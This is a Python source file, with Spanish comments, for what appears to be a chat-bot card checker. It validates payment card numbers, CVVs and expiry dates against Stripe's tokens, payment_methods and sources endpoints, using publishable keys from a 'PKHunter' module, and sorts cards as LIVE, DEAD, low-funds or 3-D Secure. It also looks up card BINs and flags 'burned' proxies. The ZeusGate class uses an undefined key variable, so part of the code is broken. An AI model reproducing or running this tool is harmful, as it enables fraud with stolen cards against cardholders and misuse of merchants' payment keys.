import requests
from pk_hunter import PKHunter

class BinLookup:
    """SISTEMA DE INTELIGENCIA DE BINS"""
    @staticmethod
    def get_info(bin_code):
        try:
            # API de alta velocidad para obtener nivel y país del BIN
            r = requests.get(f"https://lookup.binlist.net/{bin_code[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get("scheme", "VISA/MC").upper(),
                    "type": data.get("type", "CREDIT/DEBIT").upper(),
                    "level": data.get("brand", "STANDARD").upper(),
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("name", "Unknown"),
                    "flag": data.get("country", {}).get("emoji", "🌐")
                }
        except:
            pass
        # Retorno de emergencia para no detener el bot
        return {"brand": "VISA/MC", "type": "CREDIT", "level": "PREMIUM", 
                "bank": "Generic Bank", "country": "US", "flag": "🇺🇸"}

class RiskAnalyzer:
    """ANALIZADOR DE SEGURIDAD DE LA CONEXIÓN"""
    @staticmethod
    def get_risk_report(response_json):
        outcome = response_json.get('outcome', {})
        risk_level = outcome.get('risk_level', 'normal')
        if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
        if risk_level == 'elevated': return "🟡 RIESGO MEDIO (IP Sospechosa)"
        return "🟢 RIESGO BAJO (Conexión Limpia)"

class CCChecker:
    """COMANDO /chk - GATE STRIPE REAL"""
    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        payload = {
            'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            if "id" in res and '"cvc_check": "pass"' in res_text:
                return {"status": "LIVE ✅", "msg": "CVC2 Match", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Declined')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Timeout", "raw": {}}

class ChaosGate:
    """COMANDO /chaos - GATE CHAOS V2"""
    @staticmethod
    def check_chaos(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU OS 16_0 like Mac OS X)'}
        payload = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=headers, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            if 'cvc_check": "pass"' in res_text or '"status": "succeeded"' in res_text:
                return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Generic Decline')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}


class ZeusGate:
    """GATEWAY DE POTENCIA REAL 'CHARGEABLE' (NO SIMULADOR)"""
    @staticmethod
    def check_zeus(cc, mm, yy, cvv):
        sk = "sk_test_51Shy26AP..."
        headers = {'User-Agent': 'Stripe/v1 AndroidBindings/20.14.1'}
        
        payload = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': pk
        }
        
        try:
            # Consultamos la API real de Stripe
            r = requests.post('https://api.stripe.com/v1/sources', data=payload, headers=headers, timeout=15)
            res = r.json()
            
            # --- FILTRO DE SANGRE (SOLO PASA LO REAL) ---
            status = res.get('status')
            res_text = str(res).lower()

            # 1. LIVE ABSOLUTO: La tarjeta tiene fondos y está lista
            if status == 'chargeable':
                return {"status": "LIVE ✅", "msg": "Zeus Approved (Chargeable)", "raw": res}
            
            # 2. LIVE POR FONDOS: La tarjeta es real pero no tiene dinero
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            
            # 3. 3D SECURE: Tarjeta viva pero con seguridad extra
            elif "three_d_secure" in res_text or "required" in res_text:
                return {"status": "LIVE 💎 (3DS)", "msg": "3D Secure Required", "raw": res}

            # 4. MUERTE TOTAL: Cualquier error de Stripe es DEAD
            else:
                # Extraemos el motivo real del declive directamente de Stripe
                err_msg = res.get('error', {}).get('message', 'Transaction Declined')
                return {"status": "DEAD ❌", "msg": err_msg, "raw": res}

        except Exception as e:
            # Si hay error de conexión, no mentimos: es un fallo de sistema
            return {"status": "ERROR ⚠️", "msg": "Zeus Timeout/Connection Error", "raw": {}}
